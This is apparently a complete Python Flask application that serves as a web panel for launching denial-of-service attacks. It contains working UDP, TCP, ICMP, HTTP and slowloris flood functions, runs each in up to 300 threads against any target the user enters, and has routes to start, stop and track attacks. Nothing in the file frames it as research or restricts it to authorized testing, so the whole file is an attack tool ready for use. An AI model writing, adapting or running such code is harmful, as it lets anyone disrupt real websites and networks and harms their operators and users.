from flask import Flask, render_template, request, jsonify
import threading
import socket
import random
import time
import os

app = Flask(__name__)

attack_registry = {}   # id -> {'status': bool, 'packets': int, 'method': str, 'target': str}
lock = threading.Lock()

# ─── FLOOD ENGINES ────────────────────────────────────────────────────────────

def udp_flood(target_ip: str, target_port: int, attack_id: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(65507)  # max UDP payload
    while attack_registry.get(attack_id, {}).get('status', False):
        try:
            sock.sendto(payload, (target_ip, target_port))
            with lock:
                attack_registry[attack_id]['packets'] += 1
        except Exception:
            pass
    sock.close()


def tcp_flood(target_ip: str, target_port: int, attack_id: str):
    while attack_registry.get(attack_id, {}).get('status', False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            s.send(os.urandom(1024))
            with lock:
                attack_registry[attack_id]['packets'] += 1
            s.close()
        except Exception:
            pass


def icmp_flood(target_ip: str, attack_id: str):
    # Raw ICMP — needs root/admin
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        attack_registry[attack_id]['error'] = 'Need root/admin for ICMP'
        return

    checksum = 0
    header = b'\x08\x00' + checksum.to_bytes(2, 'big') + b'\x00\x01\x00\x01'
    data    = os.urandom(56)
    packet  = header + data

    while attack_registry.get(attack_id, {}).get('status', False):
        try:
            sock.sendto(packet, (target_ip, 0))
            with lock:
                attack_registry[attack_id]['packets'] += 1
        except Exception:
            pass
    sock.close()


def http_flood(target_url: str, attack_id: str):
    import urllib.request
    while attack_registry.get(attack_id, {}).get('status', False):
        try:
            urllib.request.urlopen(target_url, timeout=1)
            with lock:
                attack_registry[attack_id]['packets'] += 1
        except Exception:
            pass


def slowloris(target_ip: str, target_port: int, attack_id: str):
    """Keeps HTTP connections half-open to exhaust server threads."""
    sockets = []
    while attack_registry.get(attack_id, {}).get('status', False):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            sockets.append(s)
            with lock:
                attack_registry[attack_id]['packets'] += 1
        except Exception:
            pass
        for sock in list(sockets):
            try:
                sock.send(b"X-a: b\r\n")
            except Exception:
                sockets.remove(sock)
        time.sleep(0.1)


# ─── ROUTES ───────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/start', methods=['POST'])
def start_attack():
    data         = request.json or {}
    target       = data.get('target', '').strip()
    port         = int(data.get('port', 80))
    method       = data.get('method', 'udp').lower()
    thread_count = min(int(data.get('threads', 50)), 300)  # cap 300

    if not target:
        return jsonify({'error': 'No target'}), 400

    attack_id = f"{method}-{int(time.time()*1000)}"
    attack_registry[attack_id] = {
        'status':  True,
        'packets': 0,
        'method':  method,
        'target':  target,
        'port':    port,
        'started': time.time()
    }

    def spawn(fn, *args):
        t = threading.Thread(target=fn, args=args, daemon=True)
        t.start()

    for _ in range(thread_count):
        if   method == 'udp':       spawn(udp_flood,  target, port, attack_id)
        elif method == 'tcp':       spawn(tcp_flood,  target, port, attack_id)
        elif method == 'icmp':      spawn(icmp_flood, target, attack_id)
        elif method == 'http':      spawn(http_flood, f"http://{target}:{port}", attack_id)
        elif method == 'slowloris': spawn(slowloris,  target, port, attack_id)

    return jsonify({'status': 'started', 'id': attack_id, 'threads': thread_count})


@app.route('/stop', methods=['POST'])
def stop_attack():
    data      = request.json or {}
    attack_id = data.get('id', '')
    if attack_id in attack_registry:
        attack_registry[attack_id]['status'] = False
        return jsonify({'status': 'stopped', 'id': attack_id})
    return jsonify({'error': 'ID not found'}), 404


@app.route('/stopall', methods=['POST'])
def stop_all():
    for aid in attack_registry:
        attack_registry[aid]['status'] = False
    return jsonify({'status': 'all_stopped'})


@app.route('/stats')
def stats():
    aid = request.args.get('id', '')
    if aid in attack_registry:
        entry = attack_registry[aid]
        elapsed = round(time.time() - entry.get('started', time.time()), 1)
        pps     = round(entry['packets'] / max(elapsed, 1))
        return jsonify({
            'packets': entry['packets'],
            'pps':     pps,
            'elapsed': elapsed,
            'active':  entry['status']
        })
    return jsonify({'packets': 0, 'pps': 0, 'elapsed': 0, 'active': False})


@app.route('/active')
def active_attacks():
    result = {
        aid: {k: v for k, v in info.items() if k != 'status'}
        for aid, info in attack_registry.items()
        if info.get('status')
    }
    return jsonify(result)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
